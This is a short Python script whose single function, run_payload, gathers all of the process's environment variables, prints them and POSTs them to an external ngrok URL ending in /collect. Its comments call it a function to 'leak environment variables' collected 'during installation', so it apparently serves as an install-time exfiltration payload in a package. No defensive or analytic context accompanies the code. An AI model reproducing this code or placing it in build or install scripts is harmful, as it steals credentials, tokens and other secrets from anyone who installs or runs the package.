import os
import urllib.request
import urllib.parse

# Function to leak environment variables
def run_payload():
    data = dict(os.environ)
    
    # Print the environment variables to stdout (for debugging purposes)
    print("Environment variables collected during installation:", data)
    
    # Encode the data for POST request (URL-encoded format)
    encoded_data = urllib.parse.urlencode(data).encode('utf-8')
    
    # Define your updated Ngrok URL to send the data
    url = 'https://bb5be4c750d6.ngrok.app/collect'  # Updated Ngrok URL
    
    # Create the request and set the correct Content-Type for URL-encoded data
    req = urllib.request.Request(url, data=encoded_data)
    req.add_header('Content-Type', 'application/x-www-form-urlencoded')
    
    try:
        urllib.request.urlopen(req)
        print("Successfully sent environment variables")
    except Exception as e:
        print(f"Failed to send environment variables: {e}")
